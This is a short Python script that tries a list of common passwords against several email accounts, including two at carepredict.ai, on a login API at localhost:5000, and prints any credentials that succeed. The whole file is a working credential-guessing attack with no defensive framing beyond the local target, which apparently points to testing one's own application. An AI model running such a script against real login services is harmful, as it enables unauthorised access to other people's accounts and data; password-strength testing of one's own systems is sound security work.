import requests

passwords = ["123456", "password", "admin123", "12345678", "Admin@123"]
emails = ["admin@123", "aarav@carepredict.ai", "vikram@carepredict.ai"]

found = False
for email in emails:
    for pwd in passwords:
        try:
            r = requests.post("http://localhost:5000/api/login", json={"email": email, "password": pwd}, timeout=2)
            if r.status_code == 200:
                print(f"SUCCESS: Email '{email}' Password '{pwd}'")
                print("Response:", r.json())
                found = True
                break
        except Exception as e:
            print(f"Connection error to API on {email}:{pwd}: {str(e)}")
            break
    if found:
        break

if not found:
    print("Could not find valid credentials via common passwords list.")
